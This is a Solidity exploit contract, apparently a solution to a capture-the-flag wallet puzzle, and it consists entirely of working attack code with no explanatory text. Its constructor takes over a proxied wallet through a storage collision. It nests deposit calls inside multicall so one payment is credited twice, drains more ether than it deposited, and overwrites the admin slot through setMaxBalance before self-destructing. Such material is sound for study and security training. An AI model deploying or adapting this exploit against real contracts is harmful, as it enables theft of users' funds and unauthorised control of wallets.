pragma solidity ^0.8;

interface IWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Hack {
    constructor(IWallet wallet) payable {
        // overwrite wallet owner
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // deposit
        data[0] = deposit_data[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
        wallet.multicall{value: 0.001 ether}(data);

        // withdraw
        wallet.execute(msg.sender, 0.002 ether, "");

        // set admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender, "hack failed");
        selfdestruct(payable(msg.sender));
    }
}
